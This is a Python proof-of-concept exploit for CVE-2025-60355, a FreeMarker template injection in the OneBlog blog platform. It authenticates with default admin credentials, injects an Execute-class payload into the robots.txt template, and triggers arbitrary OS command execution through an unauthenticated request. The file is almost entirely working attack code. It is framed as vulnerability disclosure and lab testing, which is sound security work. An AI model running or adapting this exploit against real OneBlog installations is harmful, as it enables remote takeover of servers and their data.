#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OneBlog FreeMarker SSTI to Remote Code Execution
# CVE            : CVE-2025-60355
# Vendor         : zhangyd-c
# Product        : OneBlog
# Affected       : All versions <= 2.3.9 (claimed fix incomplete)
# Type           : CWE-1336 - Template Injection
# CVSS           : 9.8 (Critical)
# Platform       : Java / Spring Boot / FreeMarker
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-60355: FreeMarker SSTI → RCE in OneBlog

Demonstrates Server-Side Template Injection (SSTI) in zhangyd-c OneBlog < 2.3.9.
The application uses FreeMarker templates without sandboxing, allowing an authenticated
admin user to inject a malicious template that executes arbitrary OS commands.

Attack Flow:
  1. Authenticate to blog-admin via POST /passport/signin (Shiro auth)
  2. Inject SSTI payload into TM_ROBOTS template via POST /template/edit
  3. Trigger RCE by accessing GET /robots.txt on blog-web (unauthenticated)

Root Cause:
  FreeMarkerUtil.template2String() creates a Configuration without setting
  TemplateClassResolver, allowing ?new() to instantiate freemarker.template.utility.Execute
  which calls Runtime.exec() with attacker-controlled commands.

Usage:
  python3 poc.py <admin_host> <admin_port> <web_host> <web_port> [command]

  Defaults (lab environment):
    admin_host = 172.20.0.4  (cve-60355-admin)
    admin_port = 8085
    web_host   = 172.20.0.5  (cve-60355-web)
    web_port   = 8443
    command    = id
"""

import sys
import http.client
import urllib.parse
import json


# Default lab configuration
DEFAULT_ADMIN_HOST = "172.20.0.4"
DEFAULT_ADMIN_PORT = 8085
DEFAULT_WEB_HOST = "172.20.0.5"
DEFAULT_WEB_PORT = 8443
DEFAULT_COMMAND = "id"

# Default credentials (from init_data.sql)
USERNAME = "root"
PASSWORD = "123456"

# TM_ROBOTS template ID (from init_data.sql seed data)
TEMPLATE_ID = 4

# SSTI payload template - uses FreeMarker ?new() to instantiate Execute class
SSTI_PAYLOAD = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{cmd}")}'

# Original TM_ROBOTS template content (for cleanup)
ORIGINAL_TEMPLATE = (
    "Crawl-delay: 5\\r\\n"
    "Sitemap: ${config.cmsUrl}/sitemap.txt\\r\\n"
    "Sitemap: ${config.cmsUrl}/sitemap.xml\\r\\n"
    "Sitemap: ${config.cmsUrl}/sitemap.html\\r\\n"
)


def print_banner():
    """Print exploit banner."""
    print("=" * 70)
    print("  CVE-2025-60355: OneBlog FreeMarker SSTI → Remote Code Execution")
    print("  Affected: OneBlog < 2.3.9 (zhangyd-c)")
    print("  CVSS: 9.8 CRITICAL | CWE-1336 (Template Injection)")
    print("=" * 70)
    print()


def authenticate(admin_host, admin_port, username, password):
    """
    Step 1: Authenticate to blog-admin via Shiro login.

    Sends POST /passport/signin with credentials.
    Returns the session cookie string for subsequent requests.
    """
    print(f"[*] Step 1: Authenticating to blog-admin at {admin_host}:{admin_port}")
    print(f"    Credentials: {username} / {password}")

    conn = http.client.HTTPConnection(admin_host, admin_port, timeout=15)
    body = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "rememberMe": "true"
    })
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        conn.request("POST", "/passport/signin", body=body, headers=headers)
        response = conn.getresponse()
        response_body = response.read().decode("utf-8", errors="replace")

        # Extract Set-Cookie headers for session management
        cookies = []
        for header_name, header_value in response.getheaders():
            if header_name.lower() == "set-cookie":
                # Extract just the cookie name=value pair (before ;)
                cookie_part = header_value.split(";")[0].strip()
                cookies.append(cookie_part)

        cookie_string = "; ".join(cookies)

        # Parse JSON response
        try:
            resp_json = json.loads(response_body)
            status = resp_json.get("status")
        except json.JSONDecodeError:
            status = None

        if response.status == 200 and status == 200:
            print(f"    [+] Authentication successful! (HTTP {response.status})")
            print(f"    [+] Session cookies: {cookie_string[:80]}...")
            return cookie_string
        else:
            print(f"    [-] Authentication FAILED! HTTP {response.status}, Response: {response_body[:200]}")
            return None

    except Exception as e:
        print(f"    [-] Connection error: {e}")
        return None
    finally:
        conn.close()


def inject_template(admin_host, admin_port, cookie_string, command):
    """
    Step 2: Inject SSTI payload into TM_ROBOTS template.

    Sends POST /template/edit with the malicious FreeMarker payload.
    The payload uses ?new() to instantiate freemarker.template.utility.Execute,
    which calls Runtime.exec() with the specified command.
    """
    print(f"\n[*] Step 2: Injecting SSTI payload into TM_ROBOTS template (id={TEMPLATE_ID})")

    # Build the SSTI payload with the target command
    payload = SSTI_PAYLOAD.replace("{cmd}", command)
    print(f"    Payload: {payload}")

    conn = http.client.HTTPConnection(admin_host, admin_port, timeout=15)
    body = urllib.parse.urlencode({
        "id": TEMPLATE_ID,
        "refValue": payload
    })
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie_string,
    }

    try:
        conn.request("POST", "/template/edit", body=body, headers=headers)
        response = conn.getresponse()
        response_body = response.read().decode("utf-8", errors="replace")

        try:
            resp_json = json.loads(response_body)
            status = resp_json.get("status")
            message = resp_json.get("message", "")
        except json.JSONDecodeError:
            status = None
            message = response_body[:200]

        if response.status == 200 and status == 200:
            print(f"    [+] Template injection successful! (HTTP {response.status})")
            print(f"    [+] Server response: {message}")
            return True
        else:
            print(f"    [-] Template injection FAILED! HTTP {response.status}")
            print(f"    [-] Response: {response_body[:300]}")
            return False

    except Exception as e:
        print(f"    [-] Connection error: {e}")
        return False
    finally:
        conn.close()


def trigger_rce(web_host, web_port):
    """
    Step 3: Trigger RCE by accessing /robots.txt on blog-web.

    This endpoint renders the TM_ROBOTS template via FreeMarkerUtil.template2String()
    with the unsandboxed Configuration. The injected ?new() payload instantiates
    freemarker.template.utility.Execute and runs the OS command.

    This request is UNAUTHENTICATED — any user can trigger it.
    Returns the command output from the response body.
    """
    print(f"\n[*] Step 3: Triggering RCE via GET /robots.txt at {web_host}:{web_port}")
    print("    (This endpoint is UNAUTHENTICATED — no session required)")

    conn = http.client.HTTPConnection(web_host, web_port, timeout=15)

    try:
        conn.request("GET", "/robots.txt")
        response = conn.getresponse()
        response_body = response.read().decode("utf-8", errors="replace")

        print(f"    [+] HTTP {response.status}")
        print(f"    [+] Response body:")
        print(f"    {'─' * 50}")
        for line in response_body.strip().splitlines():
            print(f"    │ {line}")
        print(f"    {'─' * 50}")

        return response_body.strip()

    except Exception as e:
        print(f"    [-] Connection error: {e}")
        return None
    finally:
        conn.close()


def restore_template(admin_host, admin_port, cookie_string):
    """
    Cleanup: Restore the original TM_ROBOTS template content.

    Since the SSTI payload persists in the database, it would execute on every
    subsequent request to /robots.txt. This step restores the original template.
    """
    print(f"\n[*] Cleanup: Restoring original TM_ROBOTS template")

    conn = http.client.HTTPConnection(admin_host, admin_port, timeout=15)
    body = urllib.parse.urlencode({
        "id": TEMPLATE_ID,
        "refValue": ORIGINAL_TEMPLATE
    })
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie_string,
    }

    try:
        conn.request("POST", "/template/edit", body=body, headers=headers)
        response = conn.getresponse()
        response.read()

        if response.status == 200:
            print("    [+] Original template restored.")
        else:
            print(f"    [-] Restore failed (HTTP {response.status}). Manual cleanup needed.")
    except Exception as e:
        print(f"    [-] Restore error: {e}")
    finally:
        conn.close()


def exploit(admin_host, admin_port, web_host, web_port, command):
    """
    Full exploit chain for CVE-2025-60355.

    1. Authenticate to blog-admin (Shiro login)
    2. Inject SSTI payload into TM_ROBOTS template
    3. Trigger RCE via unauthenticated /robots.txt on blog-web
    4. Restore original template (cleanup)
    """
    print_banner()

    print(f"[*] Target Configuration:")
    print(f"    Admin:   http://{admin_host}:{admin_port} (injection point)")
    print(f"    Web:     http://{web_host}:{web_port} (trigger point)")
    print(f"    Command: {command}")
    print()

    # Step 1: Authenticate
    cookie_string = authenticate(admin_host, admin_port, USERNAME, PASSWORD)
    if not cookie_string:
        print("\n[!] EXPLOIT FAILED: Could not authenticate to blog-admin.")
        print("    Check that the admin service is running and credentials are correct.")
        return False

    # Step 2: Inject SSTI payload
    if not inject_template(admin_host, admin_port, cookie_string, command):
        print("\n[!] EXPLOIT FAILED: Could not inject SSTI payload into template.")
        print("    Check that the user has 'template:edit' permission.")
        return False

    # Step 3: Trigger RCE
    output = trigger_rce(web_host, web_port)
    if output is None:
        print("\n[!] EXPLOIT FAILED: Could not reach blog-web /robots.txt endpoint.")
        print("    Check that the web service is running.")
        return False

    # Step 4: Cleanup - restore original template
    restore_template(admin_host, admin_port, cookie_string)

    # Analyze results
    print("\n" + "=" * 70)
    if output and ("uid=" in output or "root" in output.lower()):
        print("  [✓] EXPLOIT SUCCESSFUL — Remote Code Execution confirmed!")
        print(f"  [✓] Command output: {output}")
        print("=" * 70)
        return True
    elif output:
        # For commands that don't return uid=, still show output
        print(f"  [✓] EXPLOIT SUCCESSFUL — Command executed, output received:")
        print(f"  [✓] Output: {output}")
        print("=" * 70)
        return True
    else:
        print("  [✗] EXPLOIT FAILED — No command output received.")
        print("=" * 70)
        return False


def main():
    """Parse arguments and run exploit."""
    admin_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_ADMIN_HOST
    admin_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_ADMIN_PORT
    web_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_WEB_HOST
    web_port = int(sys.argv[4]) if len(sys.argv) > 4 else DEFAULT_WEB_PORT
    command = sys.argv[5] if len(sys.argv) > 5 else DEFAULT_COMMAND

    success = exploit(admin_host, admin_port, web_host, web_port, command)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
